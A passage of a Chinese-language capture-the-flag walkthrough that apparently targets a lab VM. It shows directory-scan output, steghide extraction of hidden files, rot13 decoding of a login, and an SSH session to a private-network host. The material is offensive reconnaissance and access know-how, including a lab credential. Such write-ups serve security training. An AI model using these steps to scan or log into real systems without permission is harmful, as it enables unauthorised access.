+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">17</span><span><span style="color:#ff7b72;font-weight:bold">[</span>21:55:59<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">403</span> -  279B  - /.htaccess.save                                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">18</span><span><span style="color:#ff7b72;font-weight:bold">[</span>21:55:59<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">403</span> -  279B  - /.htaccess.sample
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">19</span><span><span style="color:#ff7b72;font-weight:bold">[</span>21:55:59<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">403</span> -  279B  - /.htaccess.orig
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">20</span><span><span style="color:#ff7b72;font-weight:bold">[</span>21:55:59<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">403</span> -  279B  - /.htaccess_extra                                  
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">21</span><span><span style="color:#ff7b72;font-weight:bold">[</span>21:55:59<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">403</span> -  279B  - /.htaccess_sc                                     
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">22</span><span><span style="color:#ff7b72;font-weight:bold">[</span>21:55:59<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">403</span> -  279B  - /.htaccess_orig
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">23</span><span><span style="color:#ff7b72;font-weight:bold">[</span>21:55:59<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">403</span> -  279B  - /.htaccessBAK
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">24</span><span><span style="color:#ff7b72;font-weight:bold">[</span>21:55:59<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">403</span> -  279B  - /.htaccessOLD
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">25</span><span><span style="color:#ff7b72;font-weight:bold">[</span>21:55:59<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">403</span> -  279B  - /.htaccessOLD2
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">26</span><span><span style="color:#ff7b72;font-weight:bold">[</span>21:55:59<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">403</span> -  279B  - /.html                                            
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">27</span><span><span style="color:#ff7b72;font-weight:bold">[</span>21:55:59<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">403</span> -  279B  - /.htpasswds                                       
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">28</span><span><span style="color:#ff7b72;font-weight:bold">[</span>21:55:59<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">403</span> -  279B  - /.htpasswd_test
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">29</span><span><span style="color:#ff7b72;font-weight:bold">[</span>21:55:59<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">403</span> -  279B  - /.httr-oauth                                      
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">30</span><span><span style="color:#ff7b72;font-weight:bold">[</span>21:56:00<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">403</span> -  279B  - /.php                                             
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">31</span><span><span style="color:#ff7b72;font-weight:bold">[</span>21:56:01<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">403</span> -  279B  - /.htm                                             
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">32</span><span><span style="color:#ff7b72;font-weight:bold">[</span>21:56:11<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">200</span> -    0B  - /go.php                                           
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">33</span><span><span style="color:#ff7b72;font-weight:bold">[</span>21:56:12<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">302</span> -    0B  - /index.php  -&gt;  index.html                        
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">34</span><span><span style="color:#ff7b72;font-weight:bold">[</span>21:56:12<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">302</span> -    0B  - /index.php/login/  -&gt;  index.html                 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">35</span><span><span style="color:#ff7b72;font-weight:bold">[</span>21:56:14<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">302</span> -    0B  - /logout.php  -&gt;  index.html                       
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">36</span><span><span style="color:#ff7b72;font-weight:bold">[</span>21:56:19<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">403</span> -  279B  - /server-status/                                   
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">37</span><span><span style="color:#ff7b72;font-weight:bold">[</span>21:56:19<span style="color:#ff7b72;font-weight:bold">]</span> <span style="color:#a5d6ff">403</span> -  279B  - /server-status                                    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">38</span><span>                                                                             
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">39</span><span>Task Completed</span></span></code></pre></div><p>无可疑发现</p>
+<h4 id="24-steghide工具">2.4 steghide工具<a class="anchor" href="#24-steghide%e5%b7%a5%e5%85%b7">#</a></h4>
+<p>安装steghide工具，<code>sudo apt install steghide -y</code>
+再使用steghide，先对jpg进行分析并提取<code>hint.py</code>文件，接着对bmp进行分析，密码为sudo，再提取bmp的文件<code>user.txt</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 1</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/z_downloads<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 2</span><span>└─$ steghide info funny.jpg     
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 3</span><span><span style="color:#a5d6ff">&#34;funny.jpg&#34;</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 4</span><span>  format: jpeg
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 5</span><span>  capacity: 2.5 KB
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 6</span><span>Try to get information about embedded data ? <span style="color:#ff7b72;font-weight:bold">(</span>y/n<span style="color:#ff7b72;font-weight:bold">)</span> y
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 7</span><span>Enter passphrase: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 8</span><span>  embedded file <span style="color:#a5d6ff">&#34;hint.py&#34;</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 9</span><span>    size: 93.0 Byte
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">10</span><span>    encrypted: rijndael-128, cbc
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">11</span><span>    compressed: yes
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">12</span><span>                                         
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">13</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/z_downloads<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">14</span><span>└─$ steghide extract -sf funny.jpg
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">15</span><span>Enter passphrase: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">16</span><span>wrote extracted data to <span style="color:#a5d6ff">&#34;hint.py&#34;</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">17</span><span>                                                                                        
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">18</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/z_downloads<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">19</span><span>└─$ ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">20</span><span>funny.bmp  funny.jpg  hint.py  sudo
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">21</span><span>                                                                                                    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">22</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/z_downloads<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">23</span><span>└─$ cat hint.py     
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">24</span><span>This is_not a python file but you are revolving around.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">25</span><span>well, try_ to rotate some words too.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">26</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">27</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/z_downloads<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">28</span><span>└─$ steghide info funny.bmp
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">29</span><span><span style="color:#a5d6ff">&#34;funny.bmp&#34;</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">30</span><span>  format: jpeg
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">31</span><span>  capacity: 2.5 KB
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">32</span><span>Try to get information about embedded data ? <span style="color:#ff7b72;font-weight:bold">(</span>y/n<span style="color:#ff7b72;font-weight:bold">)</span> y
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">33</span><span>Enter passphrase: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">34</span><span>  embedded file <span style="color:#a5d6ff">&#34;user.txt&#34;</span>:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">35</span><span>    size: 29.0 Byte
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">36</span><span>    encrypted: rijndael-128, cbc
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">37</span><span>    compressed: yes
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">38</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">39</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/z_downloads<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">40</span><span>└─$ steghide extract -sf funny.bmp
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">41</span><span>Enter passphrase: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">42</span><span>wrote extracted data to <span style="color:#a5d6ff">&#34;user.txt&#34;</span>.</span></span></code></pre></div><p><code>sudo</code>文件内容为：Did you notice the file name? Isn&rsquo;t is interesting?
+<code>user.txt</code>文件内容为：jgs:guvf bar vf n fvzcyr bar
+<code>hint.py</code>文件内容为：This is_not a python file but you are revolving around.well, try_ to rotate some words too.</p>
+<p>根据hint文件提示，user中文件的字符串是rot加密，是rot13，解码后内容为：wtf:this one is a simple one</p>
+<h3 id="23-ssh登录">2.3 SSH登录<a class="anchor" href="#23-ssh%e7%99%bb%e5%bd%95">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 1</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/z_downloads<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 2</span><span>└─$ ssh wtf@192.168.242.43 -p <span style="color:#a5d6ff">55077</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 3</span><span>The authenticity of host <span style="color:#a5d6ff">&#39;[192.168.242.43]:55077 ([192.168.242.43]:55077)&#39;</span> can<span style="color:#a5d6ff">&#39;t be established.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 4</span><span><span style="color:#a5d6ff">ED25519 key fingerprint is: SHA256:7llosBA8c0IhGD0Q/MfctQSSVRtzJrF8OOBmRA58IyE
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 5</span><span><span style="color:#a5d6ff">This key is not known by any other names.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 6</span><span><span style="color:#a5d6ff">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 7</span><span><span style="color:#a5d6ff">Warning: Permanently added &#39;</span><span style="color:#ff7b72;font-weight:bold">[</span>192.168.242.43<span style="color:#ff7b72;font-weight:bold">]</span>:55077<span style="color:#a5d6ff">&#39; (ED25519) to the list of known hosts.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 8</span><span><span style="color:#a5d6ff">** WARNING: connection is not using a post-quantum key exchange algorithm.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 9</span><span><span style="color:#a5d6ff">** This session may be vulnerable to &#34;store now, decrypt later&#34; attacks.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">10</span><span><span style="color:#a5d6ff">** The server may need to be upgraded. See https://openssh.com/pq.html
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">11</span><span><span style="color:#a5d6ff">wtf@192.168.242.43&#39;</span>s password: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">12</span><span>Permission denied, please try again.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">13</span><span>wtf@192.168.242.43<span style="color:#a5d6ff">&#39;s password: 
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">14</span><span><span style="color:#a5d6ff">Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-156-generic x86_64)
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">15</span><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">16</span><span><span style="color:#a5d6ff"> * Documentation:  https://help.ubuntu.com
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">17</span><span><span style="color:#a5d6ff"> * Management:     https://landscape.canonical.com
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">18</span><span><span style="color:#a5d6ff"> * Support:        https://ubuntu.com/advantage
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">19</span><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">20</span><span><span style="color:#a5d6ff">  System information as of Thu Jun 12 10:12:01 UTC 2025
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">21</span><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">22</span><span><span style="color:#a5d6ff">  System load:  0.13              Processes:           114
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">23</span><span><span style="color:#a5d6ff">  Usage of /:   49.9% of 8.79GB   Users logged in:     0
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">24</span><span><span style="color:#a5d6ff">  Memory usage: 18%               IP address for ens3: 192.168.242.43
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">25</span><span><span style="color:#a5d6ff">  Swap usage:   0%                IP address for ens4: 10.0.2.15
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">26</span><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">27</span><span><span style="color:#a5d6ff"> * Super-optimized for small spaces - read how we shrank the memory
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">28</span><span><span style="color:#a5d6ff">   footprint of MicroK8s to make it the smallest full K8s around.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">29</span><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">30</span><span><span style="color:#a5d6ff">   https://ubuntu.com/blog/microk8s-memory-optimisation
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">31</span><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">32</span><span><span style="color:#a5d6ff"> * Canonical Livepatch is available for installation.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">33</span><span><span style="color:#a5d6ff">   - Reduce system reboots and improve kernel security. Activate at:
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">34</span><span><span style="color:#a5d6ff">     https://ubuntu.com/livepatch
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">35</span><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">36</span><span><span style="color:#a5d6ff">77 packages can be updated.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">37</span><span><span style="color:#a5d6ff">1 update is a security update.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">38</span><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">39</span><span><span style="color:#a5d6ff">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">40</span><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">41</span><span><span style="color:#a5d6ff">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">42</span><span><span style="color:#a5d6ff">Last login: Tue Sep 21 19:59:59 2021 from 192.168.169.1
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">43</span><span><span style="color:#a5d6ff"> _________________________________________
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">44</span><span><span style="color:#a5d6ff">/ Best of all is never to have been born. \
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">45</span><span><span style="color:#a5d6ff">\ Second best is to die soon.             /
